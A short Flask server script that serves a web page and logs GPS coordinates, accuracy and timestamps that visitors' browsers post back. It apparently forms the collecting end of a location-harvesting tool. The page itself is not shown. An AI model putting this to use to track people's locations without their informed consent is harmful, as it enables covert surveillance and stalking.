
from flask import Flask, request, render_template
import json

app = Flask(__name__)

@app.route('/', methods=['GET'])
def serve_page():
    return render_template('index.html')

@app.route('/', methods=['POST'])
def receive():
    data = request.get_json()
    lat = data.get('latitude')
    lon = data.get('longitude')
    acc = data.get('accuracy')
    ts = data.get('timestamp')

    print("\n[+] GPS Data Received:")
    print(f"    Coordinates: {lat} {lon}")
    print(f"    Accuracy: {acc} meters")
    print(f"    Timestamp: {ts}")
    print("-" * 40)
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
